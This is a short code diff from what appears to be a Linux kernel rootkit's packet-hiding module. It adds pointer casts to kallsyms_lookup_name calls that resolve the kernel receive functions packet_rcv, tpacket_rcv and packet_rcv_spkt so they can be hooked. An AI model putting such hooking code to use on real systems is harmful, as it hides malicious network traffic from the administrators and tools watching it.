@@ -340,9 +340,9 @@ int packet_hiding_init(void) {
 
 	debug("INITIALIZE PACKET HIDING");
 
-	original_packet_rcv = kallsyms_lookup_name("packet_rcv");
-	original_tpacket_rcv = kallsyms_lookup_name("tpacket_rcv");
-	original_packet_rcv_spkt = kallsyms_lookup_name("packet_rcv_spkt");
+	original_packet_rcv = (void *)kallsyms_lookup_name("packet_rcv");
+	original_tpacket_rcv = (void *)kallsyms_lookup_name("tpacket_rcv");
+	original_packet_rcv_spkt = (void *)kallsyms_lookup_name("packet_rcv_spkt");
 
 	/* initialize mutexes */
 	mutex_init(&lock_packet_rcv);
